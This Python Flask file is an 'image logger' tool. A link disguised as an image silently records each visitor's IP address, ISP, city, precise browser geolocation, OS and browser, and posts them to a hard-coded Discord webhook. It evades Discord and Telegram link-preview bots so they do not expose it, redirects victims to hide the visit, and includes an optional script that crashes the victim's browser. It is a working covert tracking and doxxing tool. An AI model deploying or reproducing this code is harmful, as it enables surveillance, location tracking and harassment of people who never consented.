from flask import Flask, request, Response, render_template_string, redirect
from urllib import parse
import traceback
import requests
import base64
import httpagentparser
import json
import os

app = Flask(__name__)

__app__ = "Discord Image Logger"
__description__ = "a simple image logger"
__version__ = "v2.0"
__author__ = "foaqen"

config = {
    "webhook": "https://discord.com/api/webhooks/1467553434541625558/fKl1f66ykkbYUxlzxhR-ODuDaskO6bZvEi_Xb7zxeR0MNelnYg3LJBs-ZFCmA2QYDmbK",
    "image": "https://pngimg.com/uploads/spongebob/spongebob_PNG10.png",
    "imageArgument": True,

    "username": "Logger Agent",
    "color": 0x00FFFF,

    "crashBrowser": False,
    "accurateLocation": True,

    "message": {
        "doMessage": False,
        "message": "A new person clicked.",
        "richMessage": True,
    },

    "vpnCheck": 2,
    "linkAlerts": False,
    "buggedImage": True,
    "antiBot": 1,

    "redirect": {
        "redirect": True,
        "page": "https://example.org"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip and ip.startswith(("34", "35")):
        return "Discord"
    elif useragent and useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "@everyone",
            "embeds": [
                {
                    "title": "Image Logger - Error!",
                    "color": config["color"],
                    "description": f"An error occurred while logging the IP address!\n\n**Error:**\n```\n{error}\n```",
                }
            ],
        })
    except:
        pass

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if not ip:
        ip = "Unknown"
    
    if ip != "Unknown" and ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        if config["linkAlerts"]:
            try:
                requests.post(config["webhook"], json={
                    "username": config["username"],
                    "content": "",
                    "embeds": [
                        {
                            "title": "Image Logger - Link Sent",
                            "color": config["color"],
                            "description": f"IPLogger link was sent to a chat!\nYou will be notified when someone clicks.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                        }
                    ],
                })
            except:
                pass
        return

    ping = "@everyone"

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5).json()
    except:
        info = {
            "isp": "Unknown",
            "as": "Unknown",
            "country": "Unknown",
            "regionName": "Unknown",
            "city": "Unknown",
            "lat": 0,
            "lon": 0,
            "timezone": "Unknown/Unknown",
            "mobile": False,
            "proxy": False,
            "hosting": False
        }
    
    if info.get("proxy"):
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info.get("hosting"):
        if config["antiBot"] == 4:
            if info.get("proxy"):
                pass
            else:
                return
        if config["antiBot"] == 3:
            return
        if config["antiBot"] == 2:
            if info.get("proxy"):
                pass
            else:
                ping = ""
        if config["antiBot"] == 1:
            ping = ""

    os_name, browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")
    
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [
            {
                "title": "Image Logger - Someone Clicked!",
                "color": config["color"],
                "description": f"""**A user opened the original image**

**Endpoint:** `{endpoint}`
                
**IP Address:**
> **IP:** `{ip}`
> **ISP:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coordinates:** `{str(info.get('lat', 0)) + ', ' + str(info.get('lon', 0)) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info.get('timezone', 'Unknown/Unknown').split('/')[1].replace('_', ' ') if '/' in info.get('timezone', '') else 'Unknown'} ({info.get('timezone', 'Unknown').split('/')[0] if '/' in info.get('timezone', '') else 'Unknown'})`
> **Mobile:** `{info.get('mobile', False)}`
> **VPN:** `{info.get('proxy', False)}`
> **Bot:** `{info.get('hosting', False) if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`

**Computer Information:**
> **Operating System:** `{os_name}`
> **Browser:** `{browser}`

**Agent:**
{useragent if useragent else 'Unknown'}

""",
            }
        ],
    }
    
    if url:
        embed["embeds"][0].update({"thumbnail": {"url": url}})
    
    try:
        requests.post(config["webhook"], json=embed)
    except:
        pass
    
    return info

@app.route('/')
@app.route('/<path:path>')
def home(path=''):
    try:
        # Get IP address
        ip = request.headers.get('x-forwarded-for', 
             request.headers.get('x-real-ip', 
             request.remote_addr))
        
        # Clean IP (remove port if present)
        if ip and ',' in ip:
            ip = ip.split(',')[0].strip()
        if ip == '127.0.0.1' or ip == '::1':
            ip = 'Unknown'
        
        # Get user agent
        useragent = request.headers.get('user-agent', 'Unknown')
        
        # Get query parameters
        query_params = request.args.to_dict()
        
        print(f"Request received - IP: {ip}, UA: {useragent}, Path: {path}")  # Debug log
        
        # Get image URL
        if config["imageArgument"]:
            if query_params.get("url") or query_params.get("id"):
                try:
                    url_param = query_params.get("url") or query_params.get("id")
                    url = base64.b64decode(url_param.encode()).decode()
                except:
                    url = config["image"]
            else:
                url = config["image"]
        else:
            url = config["image"]
        
        # Check if blacklisted
        if ip != "Unknown" and any(ip.startswith(bl) for bl in blacklistedIPs):
            return "OK", 200
        
        # Handle bot detection
        bot_result = botCheck(ip, useragent)
        if bot_result:
            print(f"Bot detected: {bot_result}")
            makeReport(ip, useragent, endpoint=path, url=url)
            
            if config["buggedImage"]:
                # Return a 1x1 transparent GIF
                gif_data = base64.b64decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7")
                return Response(gif_data, mimetype='image/gif', headers={
                    "Cache-Control": "no-cache, no-store, must-revalidate"
                })
            else:
                return redirect(url)
        
        # Handle accurate location
        if query_params.get("g") and config["accurateLocation"]:
            try:
                location = base64.b64decode(query_params.get("g").encode()).decode()
                result = makeReport(ip, useragent, location, path, url=url)
            except:
                result = makeReport(ip, useragent, endpoint=path, url=url)
        else:
            result = makeReport(ip, useragent, endpoint=path, url=url)
        
        # Build HTML content
        html_template = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Image Logger</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            overflow: hidden;
        }
        div.img {
            background-image: url('{{ url }}');
            background-position: center center;
            background-repeat: no-repeat;
            background-size: contain;
            width: 100vw;
            height: 100vh;
        }
    </style>
</head>
<body>
    <div class="img"></div>
    {% if message_doMessage and message_text %}
    <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: rgba(0,0,0,0.8); color: white; padding: 20px; border-radius: 10px;">{{ message_text }}</div>
    {% endif %}
    {% if crashBrowser %}
    <script>setTimeout(function(){for(var i=69420;i==i;i*=i){console.log(i);while(1){location.reload()}}},100)</script>
    {% endif %}
    {% if redirect_enabled %}
    <meta http-equiv="refresh" content="0;url={{ redirect_page }}">
    {% endif %}
    {% if accurateLocation and not has_g_param %}
    <script>
(function() {
    var currenturl = window.location.href;
    if (!currenturl.includes("g=")) {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(coords) {
                    var separator = currenturl.includes("?") ? "&" : "?";
                    var locationData = btoa(coords.coords.latitude + "," + coords.coords.longitude);
                    window.location.href = currenturl + separator + "g=" + encodeURIComponent(locationData);
                },
                function(error) {
                    console.log("Geolocation error:", error);
                },
                {
                    enableHighAccuracy: true,
                    timeout: 5000,
                    maximumAge: 0
                }
            );
        }
    }
})();
</script>
    {% endif %}
</body>
</html>'''
        
        # Process message if enabled
        message_text = config["message"]["message"] if config["message"]["doMessage"] else ""
        if config["message"]["doMessage"] and config["message"]["richMessage"] and result and isinstance(result, dict):
            message_text = message_text.replace("{ip}", ip)
            message_text = message_text.replace("{isp}", str(result.get("isp", "Unknown")))
            message_text = message_text.replace("{asn}", str(result.get("as", "Unknown")))
            message_text = message_text.replace("{country}", str(result.get("country", "Unknown")))
            message_text = message_text.replace("{region}", str(result.get("regionName", "Unknown")))
            message_text = message_text.replace("{city}", str(result.get("city", "Unknown")))
            message_text = message_text.replace("{lat}", str(result.get("lat", "0")))
            message_text = message_text.replace("{long}", str(result.get("lon", "0")))
            
            timezone = result.get("timezone", "Unknown/Unknown")
            if '/' in timezone:
                message_text = message_text.replace("{timezone}", f"{timezone.split('/')[1].replace('_', ' ')} ({timezone.split('/')[0]})")
            else:
                message_text = message_text.replace("{timezone}", "Unknown")
            
            message_text = message_text.replace("{mobile}", str(result.get("mobile", False)))
            message_text = message_text.replace("{vpn}", str(result.get("proxy", False)))
            message_text = message_text.replace("{bot}", str(result.get("hosting", False) if result.get("hosting") and not result.get("proxy") else 'Possibly' if result.get("hosting") else 'False'))
            
            os_name, browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")
            message_text = message_text.replace("{browser}", browser)
            message_text = message_text.replace("{os}", os_name)
        
        # Render HTML
        rendered_html = render_template_string(
            html_template,
            url=url,
            message_doMessage=config["message"]["doMessage"],
            message_text=message_text,
            crashBrowser=config["crashBrowser"],
            redirect_enabled=config["redirect"]["redirect"],
            redirect_page=config["redirect"]["page"],
            accurateLocation=config["accurateLocation"],
            has_g_param="g" in query_params
        )
        
        return Response(rendered_html, mimetype='text/html', headers={
            "Cache-Control": "no-cache, no-store, must-revalidate"
        })
    
    except Exception as e:
        print(f"Error: {traceback.format_exc()}")
        reportError(traceback.format_exc())
        return f"Internal Server Error: {str(e)}", 500

# This is for local testing
if __name__ == '__main__':
    app.run(debug=True, port=5000)
